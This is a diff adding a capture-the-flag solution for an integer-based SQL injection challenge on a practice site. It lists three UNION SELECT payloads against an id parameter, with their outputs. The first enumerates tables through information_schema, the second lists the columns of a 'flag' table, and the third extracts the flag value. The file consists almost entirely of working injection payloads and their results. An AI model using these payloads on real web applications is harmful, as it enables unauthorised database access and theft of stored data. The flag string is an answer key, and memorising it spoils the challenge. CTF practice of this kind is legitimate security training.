@@ -1,0 +1,12 @@
+http://root0x00.altervista.org/sqli/integer.php
+
+?id=0 union select 1,group_concat(table_name separator '+'),3,4,5 from information_schema.tables group by table_schema limit 1,1
+>> users flag books BlueMilkshake_0
+
+
+?id=0 union select 1,group_concat(column_name separator '+'),3,4,5 from information_schema.columns where table_name='flag'  group by table_name
+>> id username password flag
+
+
+?id=0 union select 1, flag,3, 4,5 from flag
+>> flag{dDhbLnVnQF1UOypEbmtjd24jQ1VpP21fckNKLHZMI112QEFrKEItMzJ9fUBfLHRjTjozWFNETUxpQFNUViglLmo1Kmp6JnldTksofTItYWN2dHlxVmJKIyU9Vy57e0F3aWFKbip0M3JxOGZ0ejo1JXtSM241UXEsdk5uW2NkLnpOW2docXZucj1LaCpXdlB6R3A7ZHQ6OFY3VC5fcSpqdjVSUll9NjpoQCU5dSo9ejUmPXolMz9kMltMejVDQW1YM0hUWkdBKjZdV1VQcCwuJVgzI0UlRiw2ODJoTVR4JiFLI3lyIUxqdXhYa3lpKUYpLzMzNUZoSyM2cnY9cEw6ZilTSEFLUD8rKT9LVGJjTnpmRC1LbnlaR1l1Mj1aaHgjU3JoNipBWllTdTIpCg==}
